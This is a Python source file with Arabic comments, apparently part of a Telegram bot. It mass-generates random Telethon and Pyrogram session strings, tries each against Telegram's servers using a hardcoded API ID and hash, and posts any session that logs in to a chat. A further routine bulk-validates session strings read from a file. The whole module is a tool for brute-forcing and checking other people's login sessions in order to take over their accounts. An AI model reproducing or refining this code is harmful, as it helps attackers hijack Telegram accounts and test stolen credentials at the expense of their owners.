# SessionChecker_Functions.py
# دوال فحص جلسات تيليجرام - الدوال الوظيفية فقط
# تم فصل هذه الدوال من SessionChecker.py الأصلي

import os
import time
import random
import string
import json
import asyncio
import multiprocessing as mp
from concurrent.futures import ThreadPoolExecutor, wait, FIRST_COMPLETED
from datetime import datetime
import logging
from collections import deque
import threading
from io import StringIO
import secrets
from typing import Dict, List, Set, Optional, Tuple
import hashlib

# مكتبات فحص الجلسات
try:
    from telethon import TelegramClient
    from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, ApiIdInvalidError
    from telethon.sessions import StringSession
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("تحذير: Telethon غير مثبت. قسم فحص Telethon غير متاح.")

try:
    from pyrogram import Client
    from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, ApiIdInvalid
    PYROGRAM_AVAILABLE = True
except ImportError:
    PYROGRAM_AVAILABLE = False
    print("تحذير: Pyrogram غير مثبت. قسم فحص Pyrogram غير متاح.")

# ----------------------
# إعدادات التوليد والبرنامج
# ----------------------
# إعدادات جلسات Telethon (نفس تنسيق Tolid.py)
TELETHON_PREFIX = "1BJWap1sAU"
TELETHON_TOTAL_LENGTH = 344
TELETHON_END_CHAR = "="
TELETHON_MIDDLE_LEN = TELETHON_TOTAL_LENGTH - len(TELETHON_PREFIX) - len(TELETHON_END_CHAR)

# إعدادات جلسات Pyrogram (تنسيق مختلف)
PYROGRAM_PREFIX = "BAADC"
PYROGRAM_TOTAL_LENGTH = 350
PYROGRAM_END_CHAR = "=="
PYROGRAM_MIDDLE_LEN = PYROGRAM_TOTAL_LENGTH - len(PYROGRAM_PREFIX) - len(PYROGRAM_END_CHAR)

ALLOWED_CHARS = string.ascii_letters + string.digits + "-_"
DEFAULT_BATCH = int(os.getenv("DEFAULT_BATCH", "100"))  # دفعات أصغر للفحص
MAX_WORKERS = int(os.getenv("MAX_WORKERS", str(max(1, mp.cpu_count()))))
CHUNK_SIZE = 50  # حجم أصغر للفحص

# إعدادات API لتيليجرام (قابلة للتهيئة من البيئة)
API_ID = int(os.getenv("API_ID", os.getenv("TELEGRAM_API_ID", "6")))
API_HASH = os.getenv("API_HASH", os.getenv("TELEGRAM_API_HASH", "eb06d4abfb49dc3eeb1aeb98ae0f581e"))

# إعداد التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# متغيرات الحالة
checking_bots: List[Dict] = []  # قائمة بوتات الفحص
performance_stats = {
    'total_generated': 0,
    'total_checked': 0,
    'total_valid': 0,
    'total_invalid': 0,
    'total_time': 0.0,
    'success_rate': 0.0
}
task_history = deque(maxlen=200)
stats_lock = threading.Lock()
checked_sessions: Set[str] = set()  # لتجنب التكرار في الفحص
checked_sessions_lock = threading.Lock()

# ----------------------
# دوال توليد الجلسات
# ----------------------
def generate_telethon_session():
    """توليد جلسة Telethon عشوائية"""
    random_part = ''.join(random.choices(ALLOWED_CHARS, k=TELETHON_MIDDLE_LEN))
    return TELETHON_PREFIX + random_part + TELETHON_END_CHAR

def generate_pyrogram_session():
    """توليد جلسة Pyrogram عشوائية"""
    random_part = ''.join(random.choices(ALLOWED_CHARS, k=PYROGRAM_MIDDLE_LEN))
    return PYROGRAM_PREFIX + random_part + PYROGRAM_END_CHAR

def generate_session_batch(session_type, batch_size):
    """توليد دفعة من الجلسات"""
    if session_type == "telethon":
        return [generate_telethon_session() for _ in range(batch_size)]
    elif session_type == "pyrogram":
        return [generate_pyrogram_session() for _ in range(batch_size)]
    return []

# ----------------------
# دوال فحص الجلسات
# ----------------------
async def check_telethon_session(session_string: str, bot_token: str) -> bool:
    """فحص صلاحية جلسة Telethon"""
    if not TELETHON_AVAILABLE:
        return False
    
    try:
        # استخدام StringSession مع API_ID/API_HASH القابلة للتهيئة
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            await client.disconnect()
            return True
        else:
            await client.disconnect()
            return False
            
    except Exception as e:
        logger.debug(f"خطأ في فحص جلسة Telethon: {e}")
        return False

async def check_pyrogram_session(session_string: str, bot_token: str) -> bool:
    """فحص صلاحية جلسة Pyrogram"""
    if not PYROGRAM_AVAILABLE:
        return False
    
    try:
        # استخدام API_ID/API_HASH القابلة للتهيئة
        client = Client("temp_session", API_ID, API_HASH, session_string=session_string)
        await client.start()
        
        if await client.get_me():
            await client.stop()
            return True
        else:
            await client.stop()
            return False
            
    except Exception as e:
        logger.debug(f"خطأ في فحص جلسة Pyrogram: {e}")
        return False

def check_session_sync(session_string: str, session_type: str, bot_token: str) -> bool:
    """دالة متزامنة لفحص الجلسة"""
    loop = asyncio.new_event_loop()
    try:
        asyncio.set_event_loop(loop)
        if session_type == "telethon":
            return loop.run_until_complete(check_telethon_session(session_string, bot_token))
        elif session_type == "pyrogram":
            return loop.run_until_complete(check_pyrogram_session(session_string, bot_token))
        else:
            return False
    except Exception as e:
        logger.error(f"خطأ في فحص الجلسة المتزامن: {e}")
        return False
    finally:
        try:
            loop.close()
        except Exception:
            pass

# ----------------------
# دوال مساعدة
# ----------------------
def progress_bar(percentage, length=20):
    """إنشاء شريط تقدم نصي"""
    filled = int(length * percentage / 100)
    empty = length - filled
    return f"[{'█' * filled}{'░' * empty}] {percentage:.1f}%"

def log_activity(action, details=""):
    """تسجيل النشاط في الذاكرة فقط"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_message = f"{timestamp} - {action} - {details}"
    logger.info(log_message)
    task_history.append(log_message)

def monitor_performance(generated, checked, valid, invalid, elapsed_time):
    """تحديث إحصاءات الأداء"""
    with stats_lock:
        performance_stats['total_generated'] += generated
        performance_stats['total_checked'] += checked
        performance_stats['total_valid'] += valid
        performance_stats['total_invalid'] += invalid
        performance_stats['total_time'] += elapsed_time
        
        if performance_stats['total_checked'] > 0:
            performance_stats['success_rate'] = (performance_stats['total_valid'] / performance_stats['total_checked']) * 100

def is_session_checked(session_string: str) -> bool:
    """التحقق من أن الجلسة لم يتم فحصها مسبقاً"""
    session_hash = hashlib.md5(session_string.encode()).hexdigest()
    with checked_sessions_lock:
        if session_hash in checked_sessions:
            return True
        checked_sessions.add(session_hash)
        return False

def get_available_bot() -> Optional[str]:
    """الحصول على بوت فحص متاح"""
    if not checking_bots:
        return None
    # يمكن تحسين هذا لاختيار البوت الأقل استخداماً
    return random.choice(checking_bots)['token']

# ----------------------
# دوال إدارة بوتات الفحص
# ----------------------
def add_checking_bot(token: str) -> bool:
    """إضافة بوت فحص جديد"""
    try:
        # التحقق من صلاحية التوكن
        import requests
        response = requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=10)
        if response.status_code == 200:
            bot_info = response.json()
            if bot_info.get('ok'):
                bot_data = {
                    'token': token,
                    'username': bot_info['result']['username'],
                    'added_at': datetime.now().isoformat(),
                    'status': 'active'
                }
                checking_bots.append(bot_data)
                save_bots_config()
                return True
        return False
    except Exception as e:
        logger.error(f"خطأ في إضافة بوت الفحص: {e}")
        return False

def remove_checking_bot(index: int) -> bool:
    """حذف بوت فحص"""
    try:
        if 0 <= index < len(checking_bots):
            checking_bots.pop(index)
            save_bots_config()
            return True
        return False
    except Exception:
        return False

def save_bots_config():
    """حفظ إعدادات البوتات في ملف"""
    try:
        with open('checking_bots.json', 'w', encoding='utf-8') as f:
            json.dump(checking_bots, f, ensure_ascii=False, indent=2)
    except Exception as e:
        logger.error(f"خطأ في حفظ إعدادات البوتات: {e}")

def load_bots_config():
    """تحميل إعدادات البوتات من الملف"""
    global checking_bots
    try:
        if os.path.exists('checking_bots.json'):
            with open('checking_bots.json', 'r', encoding='utf-8') as f:
                checking_bots = json.load(f)
    except Exception as e:
        logger.error(f"خطأ في تحميل إعدادات البوتات: {e}")
        checking_bots = []

def get_checking_bots():
    """الحصول على قائمة بوتات الفحص"""
    return checking_bots.copy()

# ----------------------
# العملية الرئيسية للتوليد والفحص
# ----------------------
def session_generation_and_check_process(session_type: str, chat_id: int, context, progress_message_id: int, cancel_event: threading.Event):
    """العملية الرئيسية للتوليد والفحص المستمر"""
    start_time = time.time()
    total_generated = 0
    total_checked = 0
    total_valid = 0
    total_invalid = 0
    last_report_time = time.time()
    
    try:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            while not cancel_event.is_set():
                # توليد دفعة جديدة
                batch = generate_session_batch(session_type, DEFAULT_BATCH)
                total_generated += len(batch)
                
                # فحص الدفعة
                futures = []
                for session in batch:
                    if cancel_event.is_set():
                        break
                    
                    # تجنب التكرار في الفحص
                    if is_session_checked(session):
                        continue
                    
                    # فحص الجلسة مباشرة (لا يعتمد على وجود بوتات فحص)
                    future = executor.submit(check_session_sync, session, session_type, "")
                    futures.append((future, session))
                
                # معالجة النتائج
                for future, session in futures:
                    if cancel_event.is_set():
                        break
                    
                    try:
                        is_valid = future.result(timeout=30)
                        total_checked += 1
                        
                        if is_valid:
                            total_valid += 1
                            # إرسال الجلسة الصالحة فوراً
                            try:
                                context.bot.send_message(
                                    chat_id=chat_id,
                                    text=f"✅ جلسة {session_type.title()} صالحة:\n\n`{session}`",
                                    parse_mode="Markdown"
                                )
                                log_activity("VALID_SESSION", f"جلسة {session_type} صالحة تم إرسالها")
                            except Exception as e:
                                logger.error(f"خطأ في إرسال الجلسة الصالحة: {e}")
                        else:
                            total_invalid += 1
                            
                    except Exception as e:
                        logger.error(f"خطأ في فحص الجلسة: {e}")
                        total_invalid += 1
                
                # تحديث التقدم كل 30 ثانية
                now = time.time()
                if now - last_report_time >= 30:
                    elapsed = now - start_time
                    success_rate = (total_valid / total_checked * 100) if total_checked > 0 else 0
                    
                    try:
                        context.bot.edit_message_text(
                            chat_id=chat_id,
                            message_id=progress_message_id,
                            text=(
                                f"🔍 فحص جلسات {session_type.title()}\n\n"
                                f"📊 الإحصائيات:\n"
                                f"• مولد: {total_generated}\n"
                                f"• مفحوص: {total_checked}\n"
                                f"• صالح: {total_valid} ✅\n"
                                f"• غير صالح: {total_invalid} ❌\n"
                                f"• معدل النجاح: {success_rate:.2f}%\n"
                                f"• الوقت المنقضي: {int(elapsed)} ثانية\n\n"
                                f"🤖 بوتات الفحص النشطة: {len(checking_bots)}"
                            )
                        )
                    except Exception as e:
                        logger.debug(f"تعذر تحديث رسالة التقدم: {e}")
                    
                    # تحديث الإحصائيات العامة
                    monitor_performance(len(batch), len(futures), 
                                      sum(1 for f, _ in futures if f.done() and f.result()), 
                                      sum(1 for f, _ in futures if f.done() and not f.result()),
                                      now - last_report_time)
                    
                    last_report_time = now
                
                # توقف قصير لتجنب الإرهاق
                if not cancel_event.is_set():
                    time.sleep(0.1)
                    
    except Exception as e:
        logger.exception(f"خطأ في عملية التوليد والفحص: {e}")
        try:
            context.bot.edit_message_text(
                chat_id=chat_id, 
                message_id=progress_message_id, 
                text=f"❌ حدث خطأ أثناء العملية: {e}"
            )
        except Exception:
            pass
    
    finally:
        # الإبلاغ عن النتيجة النهائية
        total_time = time.time() - start_time
        success_rate = (total_valid / total_checked * 100) if total_checked > 0 else 0
        
        try:
            if cancel_event.is_set():
                context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_message_id,
                    text=(
                        f"⏹️ تم إيقاف عملية فحص {session_type.title()}\n\n"
                        f"📊 النتائج النهائية:\n"
                        f"• مولد: {total_generated}\n"
                        f"• مفحوص: {total_checked}\n"
                        f"• صالح: {total_valid} ✅\n"
                        f"• غير صالح: {total_invalid} ❌\n"
                        f"• معدل النجاح: {success_rate:.2f}%\n"
                        f"• إجمالي الوقت: {int(total_time)} ثانية"
                    )
                )
                log_activity("CANCELLED", f"أوقف المستخدم فحص {session_type} بعد {total_checked} فحص")
            else:
                context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=progress_message_id,
                    text=(
                        f"✅ اكتملت عملية فحص {session_type.title()}\n\n"
                        f"📊 النتائج النهائية:\n"
                        f"• مولد: {total_generated}\n"
                        f"• مفحوص: {total_checked}\n"
                        f"• صالح: {total_valid} ✅\n"
                        f"• غير صالح: {total_invalid} ❌\n"
                        f"• معدل النجاح: {success_rate:.2f}%\n"
                        f"• إجمالي الوقت: {int(total_time)} ثانية"
                    )
                )
                log_activity("COMPLETED", f"اكتملت عملية فحص {session_type}")
        except Exception:
            pass

def check_file_sessions(file_path: str, chat_id: int, context):
    """فحص جلسات من ملف"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            sessions = [line.strip() for line in f if line.strip()]
        
        total_sessions = len(sessions)
        valid_sessions = 0
        invalid_sessions = 0
        
        progress_message = context.bot.send_message(
            chat_id=chat_id,
            text=f"📁 فحص {total_sessions} جلسة من الملف...\n⏳ 0/{total_sessions}"
        )
        
        for i, session in enumerate(sessions):
            if is_session_checked(session):
                continue
            
            # تحديد نوع الجلسة بشكل أدق
            if session.startswith(TELETHON_PREFIX):
                session_type = "telethon"
            elif session.startswith(PYROGRAM_PREFIX):
                session_type = "pyrogram"
            else:
                # نوع غير معروف
                invalid_sessions += 1
                continue
            
            # فحص الجلسة (بدون الاعتماد على بوتات الفحص)
            is_valid = check_session_sync(session, session_type, "")
            
            if is_valid:
                valid_sessions += 1
                context.bot.send_message(
                    chat_id=chat_id,
                    text=f"✅ جلسة {session_type.title()} صالحة:\n\n`{session}`",
                    parse_mode="Markdown"
                )
            else:
                invalid_sessions += 1
            
            # تحديث التقدم كل 10 جلسات
            if (i + 1) % 10 == 0 or i == total_sessions - 1:
                try:
                    context.bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=progress_message.message_id,
                        text=(
                            f"📁 فحص الملف\n\n"
                            f"📊 التقدم: {i+1}/{total_sessions}\n"
                            f"✅ صالح: {valid_sessions}\n"
                            f"❌ غير صالح: {invalid_sessions}\n"
                            f"📈 معدل النجاح: {(valid_sessions/(i+1)*100):.1f}%"
                        )
                    )
                except Exception:
                    pass
        
        # النتيجة النهائية
        context.bot.edit_message_text(
            chat_id=chat_id,
            message_id=progress_message.message_id,
            text=(
                f"✅ اكتمل فحص الملف\n\n"
                f"📊 النتائج:\n"
                f"• إجمالي: {total_sessions}\n"
                f"• صالح: {valid_sessions} ✅\n"
                f"• غير صالح: {invalid_sessions} ❌\n"
                f"• معدل النجاح: {(valid_sessions/total_sessions*100):.1f}%"
            )
        )
        
        log_activity("FILE_CHECK_COMPLETED", f"فحص {total_sessions} جلسة من ملف")
        
    except Exception as e:
        logger.error(f"خطأ في فحص الملف: {e}")
        context.bot.send_message(chat_id, f"❌ خطأ في فحص الملف: {e}")

# دوال الإحصائيات والحالة
def get_performance_stats():
    """الحصول على إحصائيات الأداء"""
    with stats_lock:
        return performance_stats.copy()

def get_task_history():
    """الحصول على سجل المهام"""
    return list(task_history)

def reset_performance_stats():
    """إعادة تعيين إحصائيات الأداء"""
    with stats_lock:
        performance_stats['total_generated'] = 0
        performance_stats['total_checked'] = 0
        performance_stats['total_valid'] = 0
        performance_stats['total_invalid'] = 0
        performance_stats['total_time'] = 0.0
        performance_stats['success_rate'] = 0.0

def clear_checked_sessions():
    """مسح ذاكرة الجلسات المفحوصة"""
    with checked_sessions_lock:
        checked_sessions.clear()

# دوال فحص التوفر
def is_telethon_available():
    """التحقق من توفر مكتبة Telethon"""
    return TELETHON_AVAILABLE

def is_pyrogram_available():
    """التحقق من توفر مكتبة Pyrogram"""
    return PYROGRAM_AVAILABLE